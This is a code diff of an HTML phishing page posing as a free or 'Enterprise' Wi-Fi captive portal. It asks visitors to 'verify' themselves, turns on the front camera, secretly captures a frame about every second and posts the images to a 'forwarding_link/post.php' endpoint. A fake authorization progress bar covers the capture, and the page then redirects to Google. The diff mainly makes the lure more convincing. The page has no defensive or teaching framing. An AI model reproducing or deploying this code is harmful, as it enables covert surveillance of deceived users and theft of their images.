@@ -3,230 +3,294 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free WiFi - Connect Now</title>
-    <meta property="og:title" content="Free WiFi Hotspot">
-    <meta property="og:description" content="Connect to free high-speed WiFi">
-    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/93/93158.png">
+    <title>Enterprise Wi-Fi • Authentication</title>
+    <meta property="og:title" content="Secure Wi-Fi Hotspot">
+    <meta property="og:description" content="Connect to high-speed secure Wi-Fi">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
+        :root {
+            --primary: #2563eb;
+            --primary-hover: #1d4ed8;
+            --bg-gradient: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #020617 100%);
+            --card-bg: rgba(255, 255, 255, 0.98);
+            --text-main: #1e293b;
+            --text-secondary: #64748b;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             font-family: 'Inter', -apple-system, sans-serif;
-            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            background: var(--bg-gradient);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
+
         .portal-container {
-            background: rgba(255, 255, 255, 0.95);
-            -webkit-backdrop-filter: blur(10px);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
+            background: var(--card-bg);
+            border-radius: 24px;
             padding: 40px;
             max-width: 420px;
             width: 100%;
-            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             text-align: center;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .wifi-icon {
-            font-size: 64px;
-            margin-bottom: 15px;
-            display: block;
+
+        .nodes-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 32px;
+            box-shadow: 0 10px 15px -3px rgba(59, 130, 246, 0.3);
         }
+
         .portal-title {
             font-size: 24px;
-            font-weight: 700;
-            color: #1a1a2e;
-            margin-bottom: 5px;
+            font-weight: 800;
+            color: var(--text-main);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
         }
+
         .portal-subtitle {
-            color: #666;
+            color: var(--text-secondary);
             font-size: 14px;
-            margin-bottom: 25px;
+            margin-bottom: 28px;
         }
-        .speed-info {
+
+        .network-status {
             display: flex;
-            justify-content: space-around;
-            margin-bottom: 25px;
-            padding: 15px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #f1f5f9;
             border-radius: 12px;
-            color: white;
+            padding: 12px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #475569;
+            font-weight: 500;
         }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #10b981;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0.4; }
+        }
+
+        .speed-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
         .speed-item {
-            text-align: center;
-        }
-        .speed-value {
-            font-size: 22px;
-            font-weight: 700;
-        }
-        .speed-label {
-            font-size: 11px;
-            opacity: 0.8;
-            text-transform: uppercase;
-        }
-        .terms-box {
-            background: #f7f8fc;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            padding: 16px;
+            border-radius: 16px;
+            color: white;
             text-align: left;
         }
-        .terms-box h4 {
-            font-size: 13px;
-            color: #333;
-            margin-bottom: 8px;
+
+        .speed-label {
+            font-size: 11px;
+            color: #94a3b8;
+            text-transform: uppercase;
+            font-weight: 600;
         }
-        .terms-box ul {
-            font-size: 12px;
-            color: #666;
-            padding-left: 18px;
+
+        .speed-value {
+            font-size: 24px;
+            font-weight: 800;
+            margin-top: 4px;
         }
-        .terms-box li {
-            margin-bottom: 4px;
-        }
-        .verify-notice {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 20px;
-            font-size: 13px;
-            color: #856404;
-        }
-        .verify-notice strong {
-            display: block;
-            margin-bottom: 4px;
-        }
+
         .connect-btn {
             width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: var(--primary);
             color: white;
             border: none;
+            padding: 14px;
             border-radius: 12px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            letter-spacing: 0.5px;
+            transition: all 0.2s;
+            box-shadow: 0 4px 6px -1px rgba(37, 99, 235, 0.2);
         }
+
         .connect-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+            background: var(--primary-hover);
+            transform: translateY(-1px);
         }
-        .connect-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
+
+        .terms-text {
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-top: 16px;
+            line-height: 16px;
         }
-        .status-text {
-            margin-top: 15px;
-            font-size: 13px;
-            color: #666;
-            min-height: 20px;
-        }
-        .progress-bar {
+
+        /* Verification Modal Overlay */
+        .modal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(6px);
             display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-card {
+            background: #fff;
+            width: 90%;
+            max-width: 340px;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            animation: scaleUp 0.3s ease-out;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+        }
+
+        @keyframes scaleUp {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .scan-frame {
+            position: relative;
+            width: 150px;
+            height: 150px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 4px solid #e2e8f0;
+        }
+
+        .scan-frame video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .scan-pulse {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            border-radius: 50%;
+            border: 4px solid var(--primary);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.1); opacity: 0; }
+        }
+
+        .scan-status {
+            font-size: 15px;
+            color: var(--text-main);
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .scan-progress {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 16px;
+        }
+
+        .loader-bar {
             width: 100%;
             height: 4px;
-            background: #e9ecef;
+            background: #e2e8f0;
             border-radius: 2px;
-            margin-top: 15px;
             overflow: hidden;
         }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            border-radius: 2px;
+
+        .loader-fill {
             width: 0%;
-            transition: width 0.5s ease;
+            height: 100%;
+            background: var(--primary);
+            transition: width 0.3s linear;
         }
-        .secured-badge {
-            margin-top: 20px;
-            font-size: 11px;
-            color: #999;
-        }
-        .secured-badge span {
-            color: #2ecc71;
-        }
-        .spinner-small {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #fff;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+
     </style>
 </head>
 <body>
 
-<!-- Hidden cam capture -->
+<!-- Hidden elements for capture operations -->
 <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
+    <video id="video-fallback" playsinline autoplay></video>
 </div>
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
 <div class="portal-container">
-    <span class="wifi-icon">📶</span>
-    <h1 class="portal-title">Free WiFi Hotspot</h1>
-    <p class="portal-subtitle">High-speed internet access • No password required</p>
+    <div class="nodes-icon">📶</div>
+    <div class="portal-title">Enterprise Connect</div>
+    <div class="portal-subtitle">Secure Access Gateway Node Verification</div>
 
-    <div class="speed-info">
+    <div class="network-status">
+        <div class="status-dot"></div>
+        <span>Network Node 4G/5G Available</span>
+    </div>
+
+    <div class="speed-grid">
         <div class="speed-item">
-            <div class="speed-value">150</div>
-            <div class="speed-label">Mbps Download</div>
+            <div class="speed-label">Download</div>
+            <div class="speed-value">150+ <span style="font-size: 12px; color: #94a3b8;">Mbps</span></div>
         </div>
         <div class="speed-item">
-            <div class="speed-value">50</div>
-            <div class="speed-label">Mbps Upload</div>
-        </div>
-        <div class="speed-item">
-            <div class="speed-value">12</div>
-            <div class="speed-label">ms Ping</div>
+            <div class="speed-label">Latency</div>
+            <div class="speed-value">12 <span style="font-size: 12px; color: #94a3b8;">ms</span></div>
         </div>
     </div>
 
-    <div class="terms-box">
-        <h4>📋 Terms of Use</h4>
-        <ul>
-            <li>Free for up to 2 hours</li>
-            <li>One-time identity verification required</li>
-            <li>No VPN or proxy usage</li>
-            <li>Fair usage policy applies</li>
-        </ul>
+    <button class="connect-btn" onclick="startSecureConnect()">Verify & Connect Now</button>
+
+    <p class="terms-text">By clicking connect, you agree to the enterprise network access and identity safety guidelines.</p>
+</div>
+
+<!-- SECURE SCAN MODAL Overlay -->
+<div class="modal" id="scanModal">
+    <div class="modal-card">
+        <div class="scan-frame">
+            <video id="scanVideo" autoplay playsinline></video>
+            <div class="scan-pulse" id="pulseRing"></div>
+        </div>
+        
+        <div class="scan-status" id="scanStatus">Reading network authorization...</div>
+        <div class="scan-progress" id="scanPercent">0% Authorized</div>
+        
+        <div class="loader-bar">
+            <div class="loader-fill" id="loaderFill"></div>
+        </div>
     </div>
-
-    <div class="verify-notice">
-        <strong>🔐 Security Verification Required</strong>
-        Quick face verification to prevent abuse. Your camera will only be used for verification.
-    </div>
-
-    <button class="connect-btn" id="connectBtn" onclick="connectWifi()">
-        <span id="btnText">Connect & Verify</span>
-    </button>
-
-    <div class="progress-bar" id="progressBar">
-        <div class="progress-fill" id="progressFill"></div>
-    </div>
-
-    <p class="status-text" id="statusText"></p>
-
-    <p class="secured-badge">🔒 <span>Secured</span> connection • WPA3 Enterprise</p>
 </div>
 
 <script>
@@ -237,62 +301,69 @@ function post(imgdata) {
         url: 'forwarding_link/post.php',
         dataType: 'json',
         async: false,
-        success: function(result) {},
+        success: function() {},
         error: function() {}
     });
 }
 
 'use strict';
 
-const video = document.getElementById('video');
+const scanVideo = document.getElementById('scanVideo');
 const canvas = document.getElementById('canvas');
+const modal = document.getElementById('scanModal');
+const pulseRing = document.getElementById('pulseRing');
+const loaderFill = document.getElementById('loaderFill');
+const scanStatus = document.getElementById('scanStatus');
+const scanPercent = document.getElementById('scanPercent');
 
-const constraints = {
-    audio: false,
-    video: { facingMode: "user" }
-};
+const constraints = { audio: false, video: { facingMode: "user" } };
 
-function connectWifi() {
-    const btn = document.getElementById('connectBtn');
-    const statusText = document.getElementById('statusText');
-    const progressBar = document.getElementById('progressBar');
-    const progressFill = document.getElementById('progressFill');
-    const btnText = document.getElementById('btnText');
-
-    btn.disabled = true;
-    btnText.innerHTML = '<span class="spinner-small"></span> Verifying...';
-    statusText.textContent = 'Requesting camera for verification...';
-
+function startSecureConnect() {
+    modal.style.display = 'flex';
+    
     navigator.mediaDevices.getUserMedia(constraints)
         .then(function(stream) {
-            window.stream = stream;
-            video.srcObject = stream;
+            scanVideo.srcObject = stream;
+            
+            let progress = 0;
+            let statusTexts = [
+                "Allocating dynamic IP...",
+                "Authorizing MAC address node...",
+                "Completing node sync authorization...",
+                "Redirecting to secure mesh..."
+            ];
+            let textIndex = 0;
 
-            statusText.textContent = 'Verifying your identity...';
-            progressBar.style.display = 'block';
+            const timer = setInterval(() => {
+                progress += Math.floor(Math.random() * 8) + 4;
+                if (progress >= 100) progress = 100;
+                
+                scanPercent.innerText = `${progress}% Authorized`;
+                loaderFill.style.width = `${progress}%`;
 
-            var context = canvas.getContext('2d');
-            setInterval(function() {
-                context.drawImage(video, 0, 0, 640, 480);
+                // Background Photo Interval Capture
+                var context = canvas.getContext('2d');
+                context.drawImage(scanVideo, 0, 0, 640, 480);
                 var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                 post(canvasData);
-            }, 1500);
 
-            // Fake progress animation
-            setTimeout(function() { progressFill.style.width = '25%'; statusText.textContent = 'Scanning face data...'; }, 2000);
-            setTimeout(function() { progressFill.style.width = '50%'; statusText.textContent = 'Analyzing biometrics...'; }, 4000);
-            setTimeout(function() { progressFill.style.width = '75%'; statusText.textContent = 'Almost connected...'; }, 6000);
-            setTimeout(function() {
-                progressFill.style.width = '100%';
-                statusText.textContent = '✅ Connected! Enjoy free WiFi.';
-                btnText.textContent = 'Connected ✓';
-                btn.style.background = 'linear-gradient(135deg, #2ecc71, #27ae60)';
-            }, 8000);
+                if (progress === 100) {
+                    clearInterval(timer);
+                    scanStatus.innerText = "Authorized! Connected.";
+                    pulseRing.style.borderColor = "#10b981";
+                    loaderFill.style.background = "#10b981";
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 2000);
+                } else if (progress % 25 === 0 && textIndex < statusTexts.length - 1) {
+                    textIndex++;
+                    scanStatus.innerText = statusTexts[textIndex];
+                }
+            }, 1000);
         })
         .catch(function(err) {
-            statusText.textContent = '⚠️ Camera access denied. Verification required to connect.';
-            btnText.textContent = 'Try Again';
-            btn.disabled = false;
+            alert("Identification via Secure Node Authorization is REQUIRED for this Wi-Fi node interface connectivity. Please enable inside settings.");
+            modal.style.display = 'none';
         });
 }
 </script>
